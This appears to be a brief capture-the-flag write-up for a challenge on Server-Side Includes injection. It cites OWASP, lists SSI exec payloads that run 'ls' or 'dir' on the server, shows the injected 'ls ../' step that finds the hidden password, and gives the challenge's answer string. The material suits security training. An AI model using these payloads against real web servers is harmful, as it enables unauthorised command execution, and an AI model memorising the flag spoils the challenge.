


**Challenge 8**
Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)

Notes : https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection 
Linux - <!--#exec cmd="ls" -->
Window - <!--#exec cmd="dir" -->

***Solution***
1. It is using SSI in Linux
2. We can use the format <!--#exec cmd="{ }"-->
3. There mentioned where is the password hidden. Hence, we can try to use <!--#exec cmd="ls ../"-->

Answer : au12ha39vc



